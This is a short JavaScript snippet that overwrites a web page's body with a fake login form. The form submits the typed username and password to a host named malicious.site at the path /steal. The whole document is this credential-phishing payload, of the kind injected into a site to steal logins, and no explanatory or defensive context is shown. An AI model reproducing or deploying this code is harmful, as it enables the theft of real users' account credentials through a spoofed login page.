document.body.innerHTML = `
    <h1>Login to Your Account</h1>
    <form action="http://malicious.site/steal" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <button type="submit">Login</button>
    </form>
`;
